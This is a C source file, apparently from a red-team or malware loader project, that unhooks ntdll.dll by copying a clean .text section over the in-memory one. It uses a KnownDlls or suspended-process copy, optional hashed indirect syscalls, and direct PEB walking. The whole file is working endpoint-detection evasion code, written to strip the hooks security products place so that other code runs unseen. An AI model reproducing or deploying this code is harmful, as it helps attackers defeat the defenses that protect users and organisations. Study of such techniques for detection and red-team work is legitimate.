#include "unhooking.h"

BOOL unhookingNtdll() {
	NTSTATUS STATUS = 0;
#if defined(KNOWN_DLLS_UNHOOKING)
	DebugPrint("[+] Unhooking Ntdll via Known Dlls ! \n");
	STATUS = UnhookNtdllTextSectionViaKnownDlls();
#elif defined(SUSPENDED_PROCESS_UNHOOKING)
	DebugPrint("[+] Unhooking Ntdll via Suspended process ! \n");
	STATUS = UnhookNtdllTextSectionViaSuspended(L"runtimebroker.exe");
#endif
	if NT_SUCCESS(STATUS) {
		DebugPrint("[+] Unhooking Ntdll Text Section Succeeded ! \n");
		return TRUE;
	}
	else {
		DebugPrint("[!] Unhooking Ntdll Text Section Failed ! \n");
		return FALSE;
	}
}

BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {

	PVOID				pLocalNtdll = (PVOID)FetchLocalNtdllBaseAddress();

#ifdef DEBUG
	DebugPrint("\t[i] 'Hooked' Ntdll Base Address : 0x%p \n\t[i] 'Unhooked' Ntdll Base Address : 0x%p \n", pLocalNtdll, pUnhookedNtdll);
	DebugPrint("[#] Press <Enter> To Continue ... ");
	getchar();
#endif

	// getting the dos header
	PIMAGE_DOS_HEADER	pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	// getting the nt headers
	PIMAGE_NT_HEADERS pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
	if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	PVOID		pLocalNtdllTxt	= NULL,	// local hooked text section base address
				pRemoteNtdllTxt = NULL; // the unhooked text section base address
	SIZE_T		sNtdllTxtSize	= 0;	// the size of the text section

	// getting the text section
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

	for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {

		// the same as if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
			pLocalNtdllTxt	= (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
			pRemoteNtdllTxt	= (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
			sNtdllTxtSize	= pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

//---------------------------------------------------------------------------------------------------------------------------
	

	DebugPrint("\t[i] 'Hooked' Ntdll Text Section Address : 0x%p \n\t[i] 'Unhooked' Ntdll Text Section Address : 0x%p \n\t[i] Text Section Size : %d \n", pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
	DebugPrint("[#] Press <Enter> To Continue ... ");
	getchar();

	// small check to verify that all the required information is retrieved
	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
		return FALSE;

	// small check to verify that 'pRemoteNtdllTxt' is really the base address of the text section
	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
		return FALSE;

//---------------------------------------------------------------------------------------------------------------------------

	DebugPrint("[i] Replacing The Text Section ... ");
	DWORD dwOldProtection = 0;

#ifdef HW_INDIRECT_SYSCALL
	NTSTATUS status = 0;
	NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)PrepareSyscallHash(NtProtectVirtualMemory_JOAA);
	if (!pNtProtectVirtualMemory) {
		DebugPrint("[-] Failed to prepare syscall for NtProtectVirtualMemory.\n");
		return -2;
	}

	status = pNtProtectVirtualMemory(GetCurrentProcess(), &pLocalNtdllTxt, &sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection);
	if (!NT_SUCCESS(status)) {
		DebugPrint("[!] NtProtectVirtualMemory (WRITE) Failed with NTSTATUS: 0x%08X\n", status);
		return FALSE;
	}

	_memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

	status = pNtProtectVirtualMemory(GetCurrentProcess(), &pLocalNtdllTxt, &sNtdllTxtSize, dwOldProtection, &dwOldProtection);
	if (!NT_SUCCESS(status)) {
		DebugPrint("[!] NtProtectVirtualMemory (RESTORE) Failed with NTSTATUS: 0x%08X\n", status);
		return FALSE;
	}

#else
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	_memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
#endif 

	DebugPrint("[+] DONE !\n");

	return TRUE;
}

PVOID FetchLocalNtdllBaseAddress() {
#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif // _WIN64

	// Reaching to the 'ntdll.dll' module directly (we know its the 2nd image after 'DiskHooking.exe')
	// 0x10 is = sizeof(LIST_ENTRY)
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	return pLdr->DllBase;
}